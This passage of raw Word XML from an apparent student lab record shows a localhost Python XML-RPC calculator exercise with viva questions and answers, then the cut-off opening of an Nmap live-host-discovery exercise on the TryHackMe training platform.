        <w:t>def add(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E87CFF5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return a+b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B41A233" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def sub(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF86134" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return a-b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B6108F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def mul(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A623C7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return a*b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB75D71" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def div(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E886ADB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return a/b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72780CE0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def mod(a,b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0292EBDC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    return a%b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596EFB69" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server = SimpleXMLRPCServer(("localhost", 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11AFD699" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print("Listening on port 8000...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C861D5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.register_function(add, "add")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5DEF57" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.register_function(sub, "sub")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B3909A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.register_function(mul, "mul")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ECE916" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10BF6666" w14:textId="67D816BB" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.register_function(div, "div")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C813AD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.register_function(mod, "mod")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA7854D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>server.serve_forever()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FCE484" w14:textId="6A14B8D2" w:rsidR="007023B2" w:rsidRPr="007023B2" w:rsidRDefault="007023B2" w:rsidP="007023B2">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268842C0" w14:textId="74296FDC" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
      <w:r w:rsidR="007023B2" w:rsidRPr="007023B2">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007023B2" w:rsidRPr="007023B2">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31A0BB6E" wp14:editId="7E433A88">
            <wp:extent cx="5731510" cy="3084195"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="118110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0802" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId33"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3084195"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D8DB6D" w14:textId="77777777" w:rsidR="007023B2" w:rsidRDefault="007023B2" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5475777F" w14:textId="40399D1D" w:rsidR="0094061E" w:rsidRDefault="0094061E" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04116B2F" w14:textId="3DBC3F87" w:rsidR="0094061E" w:rsidRDefault="0062132D" w:rsidP="0062132D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B49A74B" w14:textId="1B9CCBC8" w:rsidR="0094061E" w:rsidRDefault="0062132D" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0062132D">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69428727" wp14:editId="3847D8A8">
            <wp:extent cx="5731510" cy="2284095"/>
            <wp:effectExtent l="0" t="0" r="2540" b="1905"/>
            <wp:docPr id="1970837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837525" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId34"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2284095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A3AB15" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E71F5D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus a simple calculator was developed using xmlrpc in python</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AB31B6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F13C08F" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="239F07EF" w14:textId="4BE1C372" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2700161F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495D62E0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:XML-RPC (XML Remote Procedure Call) is a protocol that allows a program to call functions on another computer using XML for data exchange over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA70D62" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is the client-server model in XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B9328F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:In the client-server model, the client sends a request to perform an operation, and the server processes the request and returns the result.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D55624" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Which Python modules are used for XML-RPC programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335673C7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Python provides the following modules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A464D3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">xmlrpc.server for creating the server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBCA9BA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">xmlrpc.client for creating the client </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC80B74" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Why is XML used in XML-RPC?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486C3489" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:XML is used because it is a standard, platform-independent format for exchanging structured data between systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A284BF9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is a remote procedure call (RPC)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F79859" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A remote procedure call is a technique that allows a program to execute a function or method on another computer as if it were a local function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139C8924" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="509BF17B" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7745F8D3" w14:textId="7CD9F514" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No: 6  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5267B32F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="0062132D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>NMAP LIVE HOST DISCOVERY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F51E7B7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343348EC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To use Nmap to discover live hosts using ARP scan, ICMP scan, and TCP/UDP ping scan in TryHackMe platform.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E815FE0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3447DB8F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Nmap is a network scanning tool that finds hosts, open ports, and services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BEC5DB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FE8D522" wp14:editId="12453393">
            <wp:extent cx="5731510" cy="136464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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1364645"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B93249" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Task 1:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Introduction </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CAD830" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
